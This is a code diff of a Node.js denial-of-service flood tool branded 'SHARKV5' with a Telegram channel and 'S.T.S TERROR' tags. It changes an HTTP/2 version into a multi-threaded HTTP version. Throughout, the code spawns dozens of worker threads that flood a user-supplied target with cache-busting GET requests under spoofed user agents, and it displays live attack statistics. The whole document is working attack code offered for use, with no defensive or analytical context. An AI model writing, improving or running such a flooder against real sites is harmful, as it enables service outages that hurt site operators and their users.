@@ -1,39 +1,33 @@
-// SHARKV4.1 - T.ME/STSVKINGDOM
-const http2 = require('http2');
+const http = require('http');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const readline = require('readline');
 const net = require('net');
 
-const THREADS = 22;
-const POWER_MULTIPLIER = 1;
-const MAX_INFLIGHT = 2000;
-const LIVE_REFRESH_RATE = 5000;
-const PROXIES_ENABLED = false;
-
 const TAGS = ['S.T.S', 'T.S.P', 'SL S.T.S TERROR'];
+const THREADS_MIN = 15;
+const THREADS_MAX = 35;
+const MAX_CONN_PER_THREAD = 50;
+const LIVE_REFRESH_RATE = 100;
 
 let totalRequests = 0;
 let successCount = 0;
 let errorCount = 0;
-let maxRps = 0;
 let rpsLastSecond = 0;
-let end;
+let maxRps = 0;
+let end = 0;
 
-function getRandomInRange(min, max) {
+function getRandomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-function randomTag() {
-    return TAGS[Math.floor(Math.random() * TAGS.length)];
-}
-
 function randomUA() {
-    return `Mozilla/5.0 (${Math.random().toFixed(4)}; V4) ${randomTag()}`;
+    const tag = TAGS[Math.floor(Math.random() * TAGS.length)];
+    return `Mozilla/5.0 (SHARK/${Math.random().toFixed(5)}) ${tag}`;
 }
 
 if (isMainThread) {
     if (process.argv.length < 4) {
-        console.error('Usage: node attack.js <target> <duration_secs>');
+        console.error("Usage: node sharkv5.js <target> <duration_sec>");
         process.exit(1);
     }
 
@@ -41,29 +35,30 @@ if (isMainThread) {
     const duration = parseInt(process.argv[3]);
     end = Date.now() + duration * 1000;
 
-    console.clear();
-    console.log(`SHARKV4.1 - T.ME/STSVKINGDOM`);
-
-    for (let i = 0; i < THREADS; i++) {
-        const initialConnections = getRandomInRange(200, 500);
-        new Worker(__filename, { workerData: { target, duration, connections: initialConnections } });
+    let activeThreads = getRandomInt(THREADS_MIN, THREADS_MAX);
+    for (let i = 0; i < activeThreads; i++) {
+        new Worker(__filename, { workerData: { target, duration } });
     }
 
     setInterval(() => {
-        maxRps = Math.max(maxRps, rpsLastSecond);
-        renderStats();
         rpsLastSecond = 0;
+        activeThreads = getRandomInt(THREADS_MIN, THREADS_MAX);
+        maxRps = Math.max(maxRps, rpsLastSecond);
+    }, 20000);
+
+    setInterval(() => {
+        renderStats();
+        maxRps = Math.max(maxRps, rpsLastSecond);
     }, LIVE_REFRESH_RATE);
 
     function renderStats() {
+        const remaining = Math.max(0, end - Date.now());
+        const mins = Math.floor(remaining / 60000);
+        const secs = Math.floor((remaining % 60000) / 1000);
+
         readline.cursorTo(process.stdout, 0, 0);
         readline.clearScreenDown(process.stdout);
-
-        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);
-        const minutesRemaining = Math.floor(timeRemaining / 60);
-        const secondsRemaining = Math.floor(timeRemaining % 60);
-
-        console.log(`SHARKV4.1 - T.ME/STSVKINGDOM`);
+        console.log(`SHARKV5 - T.ME/STSVKINGDOM`);
         console.log(`==============================`);
         console.log(`total: ${totalRequests}`);
         console.log(`max-r: ${maxRps}`);
@@ -71,7 +66,7 @@ if (isMainThread) {
         console.log(`succes: ${successCount}`);
         console.log(`vape: ${errorCount}`);
         console.log(`==============================`);
-        console.log(`REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}`);
+        console.log(`REMAINING: ${mins}:${secs < 10 ? '0' : ''}${secs}`);
     }
 
     const server = net.createServer(socket => {
@@ -85,71 +80,43 @@ if (isMainThread) {
     server.listen(9999);
 
 } else {
-    const { target, duration, connections } = workerData;
+    const { target, duration } = workerData;
     const endTime = Date.now() + duration * 1000;
 
     const socket = net.connect(9999, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
 
-    function sendLoop(client, inflight) {
-        if (Date.now() > endTime || client.destroyed) return;
-
-        if (inflight.count < MAX_INFLIGHT) {
-            try {
-                inflight.count++;
-                const req = client.request({
-                    ':method': 'GET',
-                    ':path': '/',
-                    'user-agent': randomUA(),
-                    'accept': '*/*'
-                });
-
-                req.on('response', () => {
-                    inflight.count--;
-                    sendStat('ok');
-                });
-
-                req.on('error', () => {
-                    inflight.count--;
-                    sendStat('err');
-                });
-
-                req.end();
-                sendStat('req');
-            } catch {
-                inflight.count--;
-                sendStat('err');
-            }
-        }
-
-        setTimeout(() => sendLoop(client, inflight), 0.5);
-    }
-
-    function createConnection() {
+    function flood() {
         if (Date.now() > endTime) return;
 
-        let client;
+        const options = {
+            method: 'GET',
+            headers: {
+                'User-Agent': randomUA(),
+                'Accept': '*/*',
+                'Connection': 'close',
+                'Pragma': 'no-cache',
+                'Cache-Control': 'no-cache'
+            }
+        };
+
         try {
-            client = http2.connect(target);
-            const inflight = { count: 0 };
-
-            client.on('error', () => {
-                client.destroy();
-                setTimeout(createConnection, 5000);
+            const req = http.request(target, options, res => {
+                res.on('data', () => {});
+                res.on('end', () => sendStat('ok'));
             });
 
-            client.on('goaway', () => client.close());
-            client.on('close', () => setTimeout(createConnection, 5000));
-
-            client.on('connect', () => {
-                for (let i = 0; i < connections; i++) sendLoop(client, inflight);
-            });
+            req.on('error', () => sendStat('err'));
+            req.end();
+            sendStat('req');
         } catch {
-            setTimeout(createConnection, 1000);
+            sendStat('err');
         }
+
+        setTimeout(flood, 0);
     }
 
-    for (let i = 0; i < connections; i++) {
-        createConnection();
+    for (let i = 0; i < MAX_CONN_PER_THREAD; i++) {
+        flood();
     }
 }
